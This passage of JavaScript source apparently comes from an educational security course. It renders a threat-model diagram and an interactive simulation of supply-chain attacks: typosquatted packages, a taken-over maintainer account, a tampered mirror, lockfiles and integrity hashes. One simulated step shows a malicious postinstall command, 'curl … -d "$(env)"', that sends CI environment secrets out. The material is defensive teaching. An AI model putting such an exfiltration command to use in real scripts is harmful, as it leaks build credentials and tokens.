      if (focus === ST_OPTS[0]) fr.push({ cur: "all", note: `${count} threats from 7 elements in a few minutes. The output of a threat model is a <b>list of mitigations, each one a backlog item or a test</b>. Revisit it when the diagram changes: a new data flow means new threats.` });
      return fr;
    },
    render: (f) => {
      let b = `<line class="sf-boundary" x1="195" y1="5" x2="195" y2="195"/>` + txt(200, 192, "trust boundary", "small") + txt(10, 192, "internet", "small");
      DFD.forEach((d) => {
        const on = f.cur === d.id || f.cur === "all";
        const cls = on ? "active" : "";
        if (d.kind === "flow") { const [x1, y1, x2, y2] = d.line; b += arrow(x1, y1, x2, y2, on ? "active" : ""); return; }
        if (d.kind === "store") b += `<line class="edge ${cls}" x1="${d.x}" y1="${d.y}" x2="${d.x + d.w}" y2="${d.y}" stroke-width="${on ? 3 : 1.5}"/><line class="edge ${cls}" x1="${d.x}" y1="${d.y + d.h}" x2="${d.x + d.w}" y2="${d.y + d.h}" stroke-width="${on ? 3 : 1.5}"/>`;
        else b += `<rect class="box ${cls}" x="${d.x}" y="${d.y}" width="${d.w}" height="${d.h}" rx="${d.kind === "proc" ? 30 : 3}"/>`;
        b += txt(d.x + d.w / 2, d.y + d.h / 2 + 4, d.k.split(" (")[0], "sf-t", "middle");
        b += txt(d.x + d.w / 2, d.y + d.h + 14, APPLIES[d.kind], "small mono", "middle");
      });
      const chips = "STRIDE".split("").map((l) => `<span class="sf-chip ${f.letters ? (f.letters.includes(l) ? (f.on === l ? "active" : "on") : "off") : ""}" title="${STRIDE[l][0]}"><b>${l}</b> ${STRIDE[l][0]}</span>`).join("");
      const tbl = f.list ? `<table class="sf-tbl"><tr><th></th><th>threat</th><th>mitigation</th></tr>${f.list.map(([l, t, m]) => `<tr class="${l === f.on ? "sf-hit" : ""}"><td><b>${l}</b></td><td>${esc(t)}</td><td>${esc(m)}</td></tr>`).join("")}</table>` : "";
      return `<div class="sf-col">${svg(650, 200, b, "Checkout data-flow diagram")}<div class="sf-chips">${chips}</div>${tbl}</div>`;
    },
  }));

  /* =====================================================================
   * 9. Supply chain: typosquats, version ranges, lockfiles, integrity, install scripts.
   * ===================================================================== */
  const REAL = "color-utils";
  const POPULAR = ["color-utils", "express", "lodash", "react", "requests", "axios"];
  const REG = {
    "color-utils": [{ v: "2.3.0", d: "2025-03-02" }, { v: "2.3.1", d: "2025-06-11", locked: true }, { v: "2.4.0", d: "yesterday", evil: true, note: "maintainer account taken over" }],
    "colour-utils": [{ v: "2.4.1", d: "last week", evil: true, note: "typosquat, copies the real README" }],
    "color-utlis": [{ v: "9.9.9", d: "last month", evil: true, note: "typosquat" }],
  };
  const lev = (a, b) => { const d = Array.from({ length: a.length + 1 }, (_, i) => [i]); for (let j = 1; j <= b.length; j++) d[0][j] = j; for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++) d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1)); return d[a.length][b.length]; };
  const SC_NAMES = ["color-utils", "colour-utils", "color-utlis", "colorutils"];
  const SC_LOCK = ["no lockfile", "lockfile, versions only", "lockfile + integrity hashes"];
  const SC_MIRROR = ["registry is honest", "mirror serves a tampered 2.3.1"];
  const SC_SCRIPTS = ["install scripts run", "--ignore-scripts"];
  Viz.register("security-fundamentals-supply", (el) => Viz.player(el, {
    title: "Supply chain: what actually gets installed",
    tag: "INSTALL SIMULATION · STEP THROUGH",
    legend: [["active", "current step"], ["done", "safe"], ["bad", "malicious code arrived"], ["path", "install stopped"]],
    inputs: [
      { key: "name", label: "dependency name typed", type: "select", options: SC_NAMES, value: SC_NAMES[0] },
      { key: "lock", label: "lockfile", type: "select", options: SC_LOCK, value: SC_LOCK[0] },
      { key: "mirror", label: "download source", type: "select", options: SC_MIRROR, value: SC_MIRROR[0] },
      { key: "scripts", label: "scripts", type: "select", options: SC_SCRIPTS, value: SC_SCRIPTS[0] },
    ],
    random: () => ({ name: pick(SC_NAMES), lock: pick(SC_LOCK), mirror: pick(SC_MIRROR), scripts: pick(SC_SCRIPTS) }),
    build: ({ name, lock, mirror, scripts }) => {
      const steps = [], fr = [];
      const manifest = ["{", '  "dependencies": {', `    "${name}": "^2.3.0"`, "  }", "}"];
      const lockLines = lock === SC_LOCK[0] ? ["(no lockfile committed)"] : [`"node_modules/${name}": {`, `  "version": "${name === REAL ? "2.3.1" : (REG[name] || [{ v: "?" }])[0].v}",`, ...(lock === SC_LOCK[2] ? ['  "integrity": "sha512-Qx1v…9fA=="'] : []), "}"];
      const base = { name, manifest, lockLines, lock };
      const push = (o) => fr.push({ ...base, steps: steps.slice(), ...o });
      push({ step: 0, note: `<code>package.json</code> asks for <code>${esc(name)}</code> at <code>^2.3.0</code>: any 2.x version from 2.3.0 up. The same story applies to <code>requirements.txt</code>, <code>pom.xml</code> ranges, NuGet floating versions and <code>go.mod</code>.` });
      const dist = lev(name, REAL), squat = name !== REAL && dist <= 2;
      steps.push(["name check", name === REAL ? "matches a popular package" : `distance ${dist} from "${REAL}"`]);
      push({ step: 1, warn: squat, note: name === REAL ? "The name matches the package you meant." : `<code>${esc(name)}</code> is <b>${dist} edit${dist > 1 ? "s" : ""}</b> away from the popular <code>${REAL}</code>. Supply-chain scanners flag names this close to a popular package as possible typosquats. ${lock !== SC_LOCK[0] ? "A lockfile <b>doesn't help</b> here: it faithfully pins whatever name you typed." : ""}` });
      const vers = REG[name];
      if (!vers) { steps.push(["registry", "404 Not Found"]); push({ step: 1, verdict: "path", head: "Install failed: no such package", sub: "today. Anyone can register this name tomorrow.", note: `Nobody has registered <code>${esc(name)}</code> yet, so the install fails. Attackers watch for exactly these misses and register them. Some registries block new names that are too close to popular ones.` }); return fr; }
      let chosen;
      if (name !== REAL) chosen = vers[0];
      else if (lock === SC_LOCK[0]) chosen = vers[vers.length - 1];
      else chosen = vers.find((v) => v.locked);
      steps.push(["version resolved", chosen.v]);
      push({ step: 2, chosen: chosen.v, note: name !== REAL ? `The squatted package publishes a version that satisfies the range, so it installs.` : lock === SC_LOCK[0] ? `No lockfile, so the range resolves to the <b>newest match: ${chosen.v}</b>, published <b>${chosen.d}</b> after a ${chosen.note}. Every fresh CI build picks it up immediately.` : `The lockfile pins <b>${chosen.v}</b>. The new 2.4.0 is ignored until someone deliberately updates the lockfile (and reviews the diff).` });
      const tampered = mirror === SC_MIRROR[1] && chosen.v === "2.3.1";
      if (tampered) {
        if (lock === SC_LOCK[2]) {
          steps.push(["integrity", "sha512 mismatch"]);
          push({ step: 3, chosen: chosen.v, verdict: "path", head: "EINTEGRITY: install stopped", sub: "the tarball's hash doesn't match the lockfile", note: "The mirror serves a modified 2.3.1. The lockfile recorded the hash of the real tarball, so the download is rejected. Same idea: <code>go.sum</code>, <code>pip install --require-hashes</code>, NuGet <code>packages.lock.json</code> content hashes, Gradle dependency verification." });
          return fr;
        }
        steps.push(["integrity", "not checked"]);
        push({ step: 3, chosen: chosen.v, note: "The mirror serves a modified 2.3.1. The lockfile records only the version number, so nothing notices that the bytes changed." });
      } else {
        steps.push(["integrity", lock === SC_LOCK[2] ? "sha512 matches" : "not checked"]);
        push({ step: 3, chosen: chosen.v, note: lock === SC_LOCK[2] ? "The hash matches the lockfile: these are the exact bytes reviewed when the lockfile was last updated." : "The download isn't verified against anything you recorded earlier." });
      }
      const evil = chosen.evil || tampered;
      if (evil && scripts === SC_SCRIPTS[0]) {
        steps.push(["postinstall", "curl … -d \"$(env)\""]);
        push({ step: 4, chosen: chosen.v, verdict: "bad", head: "CI secrets sent to the attacker", sub: "the postinstall script ran with the build's environment", note: "The malicious version ships a <code>postinstall</code> script. It runs <b>during install</b>, with the CI job's environment: cloud credentials, the npm publish token, the GitHub token. The app's code never even ran." });
      } else if (evil) {
        steps.push(["postinstall", "skipped"]);
        steps.push(["first import", "payload runs"]);
        push({ step: 4, chosen: chosen.v, verdict: "bad", head: "Malicious code installed", sub: "no script ran at install, but it runs on first import", note: "<code>--ignore-scripts</code> stopped the install-time payload, but the package's code is in <code>node_modules</code> and runs when your app imports it. Disabling scripts narrows the window; it doesn't remove the package." });
      } else {
        steps.push(["postinstall", scripts === SC_SCRIPTS[0] ? "none in this version" : "skipped"]);
        push({ step: 4, chosen: chosen.v, verdict: "done", head: `Installed ${name}@${chosen.v}`, sub: "the version you reviewed, byte for byte", note: `Safe this time. The SBOM records <code>${esc(name)}@${chosen.v}</code>, and SCA (Dependabot, Snyk, OWASP Dependency-Check, <code>npm audit</code>, <code>pip-audit</code>, <code>govulncheck</code>) will alert when an advisory is published for it.` });
      }
      if (evil) push({ step: 5, chosen: chosen.v, verdict: "bad", head: "Detected later by SCA", sub: `advisory for ${name}@${chosen.v} published after the fact`, note: `Two days later an advisory is published and SCA flags <code>${esc(name)}@${chosen.v}</code>. The SBOM tells you which services shipped it, so you can rotate the secrets it could reach. Prevention was cheaper: ${name !== REAL ? "review new dependencies' names and publishers" : lock === SC_LOCK[0] ? "commit a lockfile with integrity hashes and update it on purpose" : "integrity hashes"}${scripts === SC_SCRIPTS[0] ? ", and don't give install scripts your secrets" : ""}.` });
      return fr;
    },
    render: (f) => {
      const vers = REG[f.name] || [];
      const reg = `<table class="sf-tbl"><tr><th>${esc(f.name)}</th><th class="sf-nw">published</th><th></th></tr>${vers.length ? vers.map((v) => `<tr class="${f.chosen === v.v ? (v.evil ? "sf-leak" : "sf-hit") : "sf-dim"}"><td><code>${v.v}</code></td><td class="sf-nw">${v.d}</td><td>${v.evil ? `<b class="sf-koc">malicious</b> (${v.note})` : ""}</td></tr>`).join("") : '<tr class="sf-dim"><td colspan="3">no such package</td></tr>'}</table>`;
      const steps = (f.steps || []).map(([k, v], i, a) => `<div class="sf-kv ${i === a.length - 1 ? "cur" : ""}"><span>${esc(k)}</span><code class="${/mismatch|404|curl|payload|distance [12]/.test(v) ? "sf-koc" : ""}">${esc(v)}</code></div>`).join("");
      return `<div class="sf-split"><div class="sf-split-l">${codePanel(f.manifest, "json", [2], "package.json")}${codePanel(f.lockLines, "json", [], "package-lock.json")}</div><div class="sf-split-r">${reg}${steps}${f.verdict ? verdict(f.verdict, f.head, f.sub) : ""}</div></div>`;
    },
  }));
})();
